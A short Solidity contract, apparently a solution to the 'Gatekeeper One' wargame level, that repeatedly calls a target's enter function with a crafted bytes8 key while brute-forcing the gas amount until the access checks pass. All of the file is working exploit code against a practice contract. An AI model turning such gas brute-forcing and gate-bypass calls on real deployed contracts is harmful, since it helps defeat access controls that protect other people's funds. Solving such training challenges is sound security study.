// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface GatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneAttack {
    address public victim;
    event log(bytes);
    event log(bool);
    event log(uint);

    constructor (address _victim) {
        victim = _victim;
    }

    function exp() public{
        bool result;
        bytes memory data;
        for(uint i=0;i < 300;i++){
            (result,data)= victim.call{gas:8191*3+i}(abi.encodeWithSignature("enter(bytes8)",bytes8(uint64(0x1000000000008796))));
            if(result){
                emit log(result);
                break;}
        }
        emit log(result);
    }

}

